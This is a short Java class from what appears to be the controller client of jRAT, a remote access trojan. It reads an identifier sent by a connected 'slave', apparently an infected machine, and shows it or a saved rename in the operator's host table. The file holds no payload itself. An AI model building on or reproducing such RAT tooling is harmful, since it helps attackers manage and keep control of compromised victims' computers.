package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.client.Slave;
import pro.jrat.client.settings.ServerID;
import pro.jrat.client.ui.frames.Frame;
import pro.jrat.client.utils.Utils;

public class Packet15InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setServerID(slave.readLine());
		ServerID.ServerIDEntry entry = ServerID.getGlobal().findEntry(slave.getRawIP());
		if (entry == null) {
			Frame.mainModel.setValueAt(slave.getServerID(), Utils.getRow(3, slave.getIP()), 1);
		} else {
			slave.setRenamedID(entry.getName());
			Frame.mainModel.setValueAt(slave.getRenamedID(), Utils.getRow(3, slave.getIP()), 1);
		}

	}
}
